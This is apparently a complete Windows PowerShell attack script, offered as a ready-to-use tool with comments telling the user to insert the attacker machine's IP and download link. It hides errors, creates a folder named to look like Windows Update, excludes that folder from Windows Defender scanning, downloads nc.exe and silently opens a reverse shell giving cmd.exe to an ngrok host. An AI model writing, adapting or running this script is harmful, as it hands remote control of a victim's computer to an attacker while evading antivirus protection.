$ErrorActionPreference = 'SilentlyContinue'

$TempDir = "$env:TEMP\WinUpdateTemp"
$NcPath = "$TempDir\nc.exe"

try {
    New-Item -ItemType Directory -Force -Path $TempDir | Out-Null
} catch {}

try {
    Add-MpPreference -ExclusionPath $TempDir
} catch {}

# Change the url with your actual link
try {
    Invoke-WebRequest -Uri "http://192.168.0.115/nc.exe" -OutFile $NcPath
} catch {}

# Change IP with the attacker machine's IP
try {
    $WshShell = New-Object -ComObject WScript.Shell
    $WshShell.Run("`"$NcPath`" 0.tcp.in.ngrok.io 12164 -e cmd.exe", 0, $false)
} catch {}

Start-Sleep -Seconds 5
